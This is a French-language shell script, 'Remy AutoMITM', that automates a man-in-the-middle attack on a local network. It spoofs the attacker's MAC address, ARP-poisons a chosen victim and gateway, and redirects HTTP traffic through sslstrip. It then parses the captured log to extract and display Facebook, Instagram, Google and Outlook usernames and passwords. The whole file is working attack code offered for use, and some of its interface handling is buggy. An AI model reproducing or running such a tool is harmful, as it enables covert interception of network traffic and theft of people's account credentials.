#!/bin/sh 
clear

#set -eux

echo "Voulez vous dissimuler votre adresse mac?"
read repmac
#-----------------------Propostition changement adresse mac--------------
if [ $repmac = "oui" ]
	then
		clear
		echo "l'adresse mac sera changé lorsque l'interface sera choisis"
		mac=1
		sleep 1
		clear
	else
		clear
		echo "vous avez choisis de ne pas change l'adresse MAC"
		mac=0
		sleep 1
		clear
fi



#--------------Début verification que l'utilisateur est root-------------
check_root=$(id -u)
if [ $check_root -eq 0 ]
	then
		echo "user root ok"
	else
		echo "Veuillez lancé le script avec les droits root"
		sleep 3
		exit
fi
#---------------Fin verification utilisateur root---------------------
			
#----------------Verification des package installé-----------------------
#sslstrip
test=`echo $?`
echo "Vérification des packages:"
which sslstrip 1>/dev/null
if [ `echo $?` -ne 0 ]
	then 
		clear
		echo "sslstrip doit-être installé (aptitude install sslstrip ;) )"
		echo " "
		echo "le programme va se terminer"
		sleep 3
		exit
	else
		echo "sslstrip installé"
	fi
#arpspoof
which arpspoof 1>/dev/null
if [ `echo $?` -ne 0 ]
	then 
		clear
		echo "arpspoof doit-être installé, (aptitude install dsniff ;) )"
		echo " "
		echo "le programme va se terminer"
		sleep 3
		exit
	else
		echo "arpspoof installé"
fi
#macchanger

which macchanger 1>/dev/null
if [ `echo $?` -ne 0 ]
	then
		clear
	        echo "macchanger doit-être installé, (aptitude install macchanger ;) )"
	        echo " "
	        echo "le programme va se terminer"
	        sleep 3
	        exit
	else
	        echo "macchanger installé"
fi
#------------------------Fin de la verification des package necessaire---------------------- 
#-----------------------Déclaration des fonctions------------------------------------------
status() {
	ctrl_sslstrip=$(ps aux | grep -i "sslstrip " | head -n 1 | grep -vi "grep" |awk '{print $2}')	
	if [ -z $ctrl_sslstrip ]
		then
			sslstat="sslstrip \033[0;31mOFF\033[0m"
			vssl=0
			port=0
		else
			sslstat="sslstrip \033[0;32mON\033[0m PID: $ctrl_sslstrip" 
			vssl=1
	fi
	
	ctrl_arpspoof=$(ps aux | grep -i "arpspoof" | head -n 10 | grep -vi "grep"  | awk '{print $2}')
	if [ -z $ctrl_arpspoof ]
		then 
			arpstat="arpspoof \033[0;31mOFF\033[0m"
			varp=0
			port=0
		else
			arpstat="arpspoof \033[0;32mON\033[0m PID: $ctrl_arpspoof"
			varp=1
	fi
	ctrl_iptable=$(iptables -t nat -L | grep "REDIRECT" | grep "dpt:http" | awk '{print $1}')
	if [ -z $ctrl_iptable ]
		then
			iptablestat="iptables \033[0;31mOFF\033[0m"
			vip=0
			port=0
		else
			iptablestat="iptables \033[0;32mON\033[0m"
			vip=1
	fi
	clear		
	echo $sslstat
	echo $arpstat
	echo $iptablestat
		

}


iptab(){
#if [ -z $1 ] 
if [ $1 -eq 0 ]
	then
		echo " " 
		echo "Redirection générées par le programme: "
		iptr="Pas de redirections"
	else
		iptr=$(iptables -t nat -L --line-numbers| grep REDIRECT | grep -w "$1")
		iptd=$(iptables -t nat -L --line-numbers| grep REDIRECT | grep -w "$1" | awk '{print $1}')
fi
}


ctrl(){
ctrl_sslstrip=$(ps aux | grep -i "sslstrip " | head -n 1 | grep -vi "grep" |awk '{print $2}')
ctrl_arpspoof=$(ps aux | grep -i "arpspoof" | head -n 1 | grep -vi "grep" |awk '{print $2}')
}

macc(){
if [ $1 -eq 1 ]
	then
		PreviousMac=$(ifconfig | grep HW | grep $iface | awk '{print $5}')
		ifconfig $iface down
		macchanger -r $iface
		ifconfig $iface up  
		NewMac=$(ifconfig | grep HW | grep eth0 | awk '{print $5}')
		clear
		echo "Ancienne mac= \033[0;32m$PreviousMac\033[0m"
		echo "Nouvelle mac= \033[0;32m$NewMac\033[0m"
		sleep 2
fi 
}

surveillance(){
checkboucle=0
while [ $checkboucle -eq "0" ]
	do
		date=`date | cut -d "(" -f 1`
		checkping=`ping -c 1 $1`
		if [ `echo $?` -eq "1" ]
			then
				clear
				echo " "
				echo "Attente de la connexion de la cible --> \033[0;32m $date\033[0m"
				sleep 1
			else
				clear
				echo "Cible connecté"
				sleep 1
				checkboucle=1
		fi
		sleep 1
	done
}

resume(){
if [ -z $1 ] || [ -z $2 ]
	then
		echo "Ip cible:  "
		echo "Passerelle: "
	else
		echo "Ip cible: \033[0;32m$1\033[0m  "
	        echo "Passerelle: \033[0;32m $2\033[0m"
fi
}

#----------------------------------Check terminé début du programme-----------------------------------
sortie=0
while [ $sortie -eq "0" ]
	do      
		echo " "
		status
		echo " "
		iptab $port 
		echo $iptr
		echo " "
		resume $vict $passerelle
		echo " "
		echo "=================Remy AutoMITM MENU================="
		echo "1. Lancer l'attaque MITM"
		echo "2. Arrêter les process en cours"
		echo "3. Fermer le programme"
		echo "4. Check du fichier sslstrip.log (outlook-google-facebook) "
                echo "Choisissez l'action que vous souhaitez faire (1-4)"
		read choix
		case $choix in
			"1")
				ctrl
				if [ -z $ctrl_sslstrip ] && [ -z $ctrl_arpspoof ] # si arpspoof et sslstrip ne sont pas lancés alors..
					then
			        		clear
						echo "Entrez l'adresse ip de la victime:"
						read vict
						clear
						echo " "
						echo "Entrez l'adresse ip de la passerelle"
						read passerelle
						clear
						echo " " 
						echo "Entrez le port d'écoute de sslstrip"
						read port
						clear
						echo " "
						echo "Quel interface souhaitez vous utiliser?:"
						ifconfig | cut -d " " -f 1 | sed '/^$/d' 
						read iface
						clear
						echo " "
						echo "Voulez vous mettre la cible sous surveillance (la machine doit répondre au ping)?"
						read survey
						if [ $survey = "oui" ]
							then 
								surveillance $vict 
						fi
						macc $mac
						echo 1 > /proc/sys/net/ipv4/ip_forward &
						##mise en place de l'écoute en local
						sslstrip -w sslstrip.log -a -l $port -f 2> /dev/null &
						iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port 
						iptab $port
						##empoisonnement de cache ARP
						arpspoof -i $iface -t $passerelle $vict 2> /dev/null &
						arpspoof -i $iface -t $vict $passerelle 2> /dev/null &
						clear
						echo "debut" > sslstrip.log
						resume $vict $passerelle
						echo "\033[0;32mL'attaque est en cours\033[0m"
						sleep 2					
					else
						clear
						echo "\033[0;31mL'attaque est déjà lancée\033[0m"
						sleep 2
				fi
				
					;;
			"2")
				clear
				ctrl
				if [ -z $ctrl_sslstrip ] && [ -z $ctrl_arpspoof ]
					then
						clear
						echo "\033[0;31mLes process ne sont pas lancées\033[0m"
						sleep 2
					elif [ -z $ctrl_sslstrip ]
						then 
							clear
							killall arpspoof
							echo "supression $iptd"
							iptables -t nat -D PREROUTING $iptd
							echo "arpspoof: arrêt en cours, veuillez patienter"
					 		sleep 2
					 		clear
					 		echo "\033[0;32mAttaque Stoppée\033[0m"
					 		sleep 2
						
					elif [ -z $ctrl_arpspoof ]
						then
							clear
					 		killall sslstrip
					 		iptables -t nat -D PREROUTING $iptd					
					 		echo "sslstrip: arrêt en cours, veuillez patienter"
					 		sleep 2
					 		clear
					 		echo "\033[0;32mAttaque Stoppée\033[0m"
					 		sleep 2
					else
						clear
						killall arpspoof
						killall sslstrip
						iptables -t nat -D PREROUTING $iptd 
						echo " arpspoof & ssltrip: arrêt en cours, veuillez patienter"
						sleep 2  
		                                clear  
		                                vict=" "
		                                passerelle=" " 
		                                echo "\033[0;32mAttaque Stoppée\033[0m"
		                                sleep 2
		                                                                                                                                                                                                                                                                                                
				
				fi
				;;
			"3")
				clear
				iptables -t nat -D PREROUTING $iptd 2> /dev/null
				killall arpspoof 2>/dev/null	
				killall sslstrip 2>/dev/null
				echo "Le programme est en cours d'arrêt"
				sortie="1"                              
				;;                                                                  
			"4")
				clear
				check=`ls -s`
				rep_loc=`pwd`
				boucle="1"
				echo "Choisissez le fichier sslstrip.log (répertoir courant: $rep_loc)"
				read chemin
				
#---------------------------------------Verifie que le fichier existe-------------------------------
				if [ -f $chemin ]
					then	
						clear
						echo "\033[0;32mFichier ok.\033[0m"
						echo "----------"
					else
						while [ $boucle != "0"  ]
							do
#								clear
								echo "$boucle"
								echo "le fichier spécifié n'existe pas"
								echo "Saisissez le chemin du fichier:"
								read chemin
								if [ -f $chemin ]
									then
										echo "le fichier existe"
										boucle="0"
										echo "$boucle"
									else
										echo "le fichier n'existe pas"
										boucle="1"
								fi
							done
				fi
#-------------------------------------Test sur le fichier termine-------------------------------------

#-------------------------------------Verification des information de comptes-------------------------
					facebook_login=$(grep -a "email=" $chemin| grep -a "&pass=" | sed 's/.*email=\([^&]*\).*/\1/') #recup du login
					facebook_pass=$(grep -a "email=" $chemin| grep -a "&pass=" | sed 's/.*pass=\([^&]*\).*/\1/')

					if [ -z $facebook_login ] || [ -z $facebook_pass ] # On vérifie que que le login et le mot de passe ne sont pas vide
						then
							checkfb=1
						else
							checkfb=0
					fi
					
					insta_login=$(grep -a "username=" $chemin | grep -a "&pass" | sed 's/.*username=\([^&]*\).*/\1/')
                                        insta_pass=$(grep -a "username=" $chemin | grep -a "&pass" | sed 's/.*password=\([^&]*\).*/\1/')
					

                                        if [ -z $insta_login ] || [ -z $insta_pass ] # On vérifie que que le login et le mot de passe ne sont pas vide
                                                then
                                                        checkinsta=1
                                                else
                                                        checkinsta=0
                                        fi


					gmail_login=$(grep -a "Email=" $chemin | grep -a "&Passwd=" | sed 's/.*Email=\([^&]*\).*/\1/')
					gmail_pass=$(grep -a "Email=" $chemin | grep -a "&Passwd=" | sed 's/.*Passwd=\([^&]*\).*/\1/')

					if [ -z $gmail_login ] || [ -z $gmail_pass ]
						then
        						checkgm=1
						else
               						 checkgm=0
						fi

					outlook_login=$(grep -a "loginfmt=" $chemin | grep -a "&passwd=" | sed 's/.*login=\([^%]*\).*/\1/')
					outlook_pass=$(grep -a "loginfmt=" $chemin | grep -a "&passwd=" | sed 's/.*passwd=\([^&]*\).*/\1/')

					if [ -z $outlook_login ] || [ -z $outlook_pass ]
					        then
					                checkou=1
						else
							checkou=0
					fi                                            
#--------------------------------------------AFFICHAGE----------------------------------------------                                                                                
					if [ $checkfb -eq 0 ]
						then
							echo "Des informations de connexions FACEBOOK ont été trouvées!"
							echo " "
							echo " \033[0;32mLogin:\033[0m $facebook_login"
							echo " \033[0;32mPassword:\033[0m $facebook_pass"
							echo "--------------------------------------------------------------------------------"
							echo " "
						else
							echo "\033[0;31m Pas de mots de passe FACEBOOK trouvé\033[0m"
							echo "--------------------------------------------------------------------------------"	
							echo " "
						fi
						
                                        if [ $checkinsta -eq 0 ]
                                                then
                                                        echo "Des informations de connexions Instagram ont été trouvées"
                                                        echo " \033[0;32mLogin:\033[0m $insta_login  \033[0;32mPassword:\033[0m $insta_pass"
                                                        echo "--------------------------------------------------------------------------------"
                                                        echo " "
                                                else
                                                        echo "\033[0;31m Pas de mots de passe GOOGLE trouvé\033[0m"
                                                        echo "--------------------------------------------------------------------------------"
                                                        echo " "
                                        fi


					if [ $checkgm -eq 0 ]
						then
							echo "Des informations de connexions GOOGLE ont été trouvées"
							echo " \033[0;32mLogin:\033[0m $gmail_login  \033[0;32mPassword:\033[0m $gmail_pass"
							echo "--------------------------------------------------------------------------------"
							echo " "
						else
							echo "\033[0;31m Pas de mots de passe GOOGLE trouvé\033[0m"
							echo "--------------------------------------------------------------------------------"
							echo " "
					fi
	
					if [ $checkou -eq 0 ]
						then
							echo "Des informations de connexions OUTLOOK ont été trouvées"
							echo "\033[0;32mLogin:\033[0m $outlook_login"
							echo " "
							echo "\033[0;32mPassword:\033[0m $outlook_pass"
							echo "--------------------------------------------------------------------------------"
							echo " "
						else
							echo "\033[0;31m Pas de mots de passe OUTLOOK trouvé\033[0m"
							echo "--------------------------------------------------------------------------------"
							echo " "
					fi
					sleep 10
				;;

		esac
done                                                                                                                                                                       
